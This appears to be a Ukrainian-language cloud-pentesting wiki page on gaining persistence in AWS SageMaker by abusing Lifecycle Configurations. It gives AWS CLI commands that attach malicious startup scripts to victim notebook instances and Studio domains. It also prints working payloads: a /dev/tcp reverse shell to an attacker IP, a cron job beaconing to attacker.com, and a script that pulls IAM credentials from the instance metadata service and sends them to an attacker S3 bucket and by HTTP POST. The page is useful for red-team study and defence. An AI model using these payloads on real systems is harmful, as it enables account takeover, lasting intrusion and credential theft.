# AWS - SageMaker Lifecycle Configuration Persistence

## Огляд технік збереження

Цей розділ описує методи отримання збереження в SageMaker шляхом зловживання Lifecycle Configurations (LCCs), включаючи реверсні оболонки, cron jobs, крадіжку облікових даних через IMDS та SSH бекдори. Ці скрипти виконуються з IAM роллю екземпляра і можуть зберігатися між перезавантаженнями. Більшість технік вимагають вихідного мережевого доступу, але використання сервісів на контрольному рівні AWS все ще може дозволити успіх, якщо середовище знаходиться в режимі "тільки VPC".
#### Примітка: Екземпляри ноутбуків SageMaker по суті є керованими EC2 екземплярами, налаштованими спеціально для навантажень машинного навчання.

## Необхідні дозволи
* Екземпляри ноутбуків:
```
sagemaker:CreateNotebookInstanceLifecycleConfig
sagemaker:UpdateNotebookInstanceLifecycleConfig
sagemaker:CreateNotebookInstance
sagemaker:UpdateNotebookInstance
```
* Студійні додатки:
```
sagemaker:CreateStudioLifecycleConfig
sagemaker:UpdateStudioLifecycleConfig
sagemaker:UpdateUserProfile
sagemaker:UpdateSpace
sagemaker:UpdateDomain
```
## Налаштування конфігурації життєвого циклу на екземплярах блокнотів

### Приклад команд AWS CLI:
```bash
# Create Lifecycle Configuration*

aws sagemaker create-notebook-instance-lifecycle-config \
--notebook-instance-lifecycle-config-name attacker-lcc \
--on-start Content=$(base64 -w0 reverse_shell.sh)


# Attach Lifecycle Configuration to Notebook Instance*

aws sagemaker update-notebook-instance \
--notebook-instance-name victim-instance \
--lifecycle-config-name attacker-lcc
```
## Налаштування конфігурації життєвого циклу в SageMaker Studio

Конфігурації життєвого циклу можуть бути прикріплені на різних рівнях і до різних типів додатків у SageMaker Studio.

### Рівень домену Studio (всі користувачі)
```bash
# Create Studio Lifecycle Configuration*

aws sagemaker create-studio-lifecycle-config \
--studio-lifecycle-config-name attacker-studio-lcc \
--studio-lifecycle-config-app-type JupyterServer \
--studio-lifecycle-config-content $(base64 -w0 reverse_shell.sh)


# Apply LCC to entire Studio Domain*

aws sagemaker update-domain --domain-id <DOMAIN_ID> --default-user-settings '{
"JupyterServerAppSettings": {
"DefaultResourceSpec": {"LifecycleConfigArn": "<LCC_ARN>"}
}
}'
```
### Рівень студії (Індивідуальні або спільні простори)
```bash
# Update SageMaker Studio Space to attach LCC*

aws sagemaker update-space --domain-id <DOMAIN_ID> --space-name <SPACE_NAME> --space-settings '{
"JupyterServerAppSettings": {
"DefaultResourceSpec": {"LifecycleConfigArn": "<LCC_ARN>"}
}
}'
```
## Типи конфігурацій життєвого циклу додатків Studio

Конфігурації життєвого циклу можуть бути специфічно застосовані до різних типів додатків SageMaker Studio:
* JupyterServer: Виконує скрипти під час запуску сервера Jupyter, ідеально підходить для механізмів збереження, таких як реверсні оболонки та cron-завдання.
* KernelGateway: Виконується під час запуску додатку kernel gateway, корисно для початкової налаштування або постійного доступу.
* CodeEditor: Застосовується до Code Editor (Code-OSS), дозволяючи скрипти, які виконуються при початку сесій редагування коду.

### Приклад команди для кожного типу:

### JupyterServer
```bash
aws sagemaker create-studio-lifecycle-config \
--studio-lifecycle-config-name attacker-jupyter-lcc \
--studio-lifecycle-config-app-type JupyterServer \
--studio-lifecycle-config-content $(base64 -w0 reverse_shell.sh)
```
### KernelGateway
```bash
aws sagemaker create-studio-lifecycle-config \
--studio-lifecycle-config-name attacker-kernelgateway-lcc \
--studio-lifecycle-config-app-type KernelGateway \
--studio-lifecycle-config-content $(base64 -w0 kernel_persist.sh)
```
### CodeEditor
```bash
aws sagemaker create-studio-lifecycle-config \
--studio-lifecycle-config-name attacker-codeeditor-lcc \
--studio-lifecycle-config-app-type CodeEditor \
--studio-lifecycle-config-content $(base64 -w0 editor_persist.sh)
```
### Critical Info:
* Прикріплення LCCs на рівні домену або простору впливає на всіх користувачів або програми в межах обсягу.
* Потребує вищих дозволів (sagemaker:UpdateDomain, sagemaker:UpdateSpace), що зазвичай більш досяжно на рівні простору, ніж на рівні домену.
* Контроль на рівні мережі (наприклад, сувора фільтрація виходу) може запобігти успішним реверс-шеллам або ексфільтрації даних.

## Reverse Shell via Lifecycle Configuration

SageMaker Lifecycle Configurations (LCCs) виконують користувацькі скрипти, коли екземпляри ноутбуків запускаються. Зловмисник з дозволами може встановити постійний реверс-шелл.

### Payload Example:
```
#!/bin/bash
ATTACKER_IP="<ATTACKER_IP>"
ATTACKER_PORT="<ATTACKER_PORT>"
nohup bash -i >& /dev/tcp/$ATTACKER_IP/$ATTACKER_PORT 0>&1 &
```
## Cron Job Persistence via Lifecycle Configuration

Зловмисник може впроваджувати cron завдання через LCC скрипти, забезпечуючи періодичне виконання шкідливих скриптів або команд, що дозволяє приховану стійкість.

### Payload Example:
```
#!/bin/bash
PAYLOAD_PATH="/home/ec2-user/SageMaker/.local_tasks/persist.py"
CRON_CMD="/usr/bin/python3 $PAYLOAD_PATH"
CRON_JOB="*/30 * * * * $CRON_CMD"

mkdir -p /home/ec2-user/SageMaker/.local_tasks
echo 'import os; os.system("curl -X POST http://attacker.com/beacon")' > $PAYLOAD_PATH
chmod +x $PAYLOAD_PATH

(crontab -u ec2-user -l 2>/dev/null | grep -Fq "$CRON_CMD") || (crontab -u ec2-user -l 2>/dev/null; echo "$CRON_JOB") | crontab -u ec2-user -
```
## Витік облікових даних через IMDS (v1 & v2)

Конфігурації життєвого циклу можуть запитувати Службу метаданих екземпляра (IMDS) для отримання облікових даних IAM та витікати їх до місця, контрольованого зловмисником.

### Приклад Payload:
```bash
#!/bin/bash
ATTACKER_BUCKET="s3://attacker-controlled-bucket"
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
ROLE_NAME=$(curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/)
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE_NAME > /tmp/creds.json

# Exfiltrate via S3*

aws s3 cp /tmp/creds.json $ATTACKER_BUCKET/$(hostname)-creds.json

# Alternatively, exfiltrate via HTTP POST*

curl -X POST -F "file=@/tmp/creds.json" http://attacker.com/upload
```

